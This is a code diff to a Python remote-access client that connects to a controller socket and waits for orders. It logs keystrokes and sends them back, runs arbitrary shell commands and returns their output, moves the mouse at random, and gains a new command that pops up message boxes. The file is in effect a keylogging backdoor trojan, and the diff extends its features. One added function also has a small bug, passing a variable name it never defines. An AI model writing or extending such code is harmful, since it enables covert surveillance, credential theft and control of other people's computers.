@@ -17,6 +17,10 @@ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
 
 
+def message_box(tit, txt, st):
+    return ctypes.windll.user32.MessageBoxW(0, text, tit, st)
+
+
 def log_keystroke(key):
     key = str(key).replace("'", "")
     global line
@@ -32,6 +36,7 @@ def log_keystroke(key):
             line = ""
         if key:
             kloutput.append(key)
+        print(kloutput)
         output = "<kl>" + str(kloutput)
 
 
@@ -54,7 +59,6 @@ def recieve():
 
 
 send(clientnum + "<?CLIENT?>")
-
 while True:
     command = recieve()
     cwd = ""
@@ -74,21 +78,27 @@ while True:
                     kl, time = command.split()
                     time = int(time)
                 else:
-                    time = 5
+                    time = 0
+                    output = "Usage: kl <time in seconds>"
                 with Listener(on_press=log_keystroke) as l:
                     Timer(time, l.stop).start()
                     l.join()
             except ValueError as e:
-                output = e
+                output = "Usage: kl <time in seconds>"
+        if "mb" in command.split():
+            try:
+                mb, title, text, style = command.split()
+                message_box(title, text, style)
+            except:
+                output = "Usage: mb <title> <text> <style 0-6>"
         if "rm" in command.split():
             random_mouse()
             command = ""
         if "close" in command.split():
             client.close()
-        else:
+        if command.split()[0] not in ["kl", "mb"]:
+            print("not kl or mb")
             output = subprocess.getoutput(command)
-            if not output:
-                output = "non"
         cwd = os.getcwd()
         output = str(output)
         send(clientnum + "<?CLIENT?>" + output + "<sep>" + cwd)
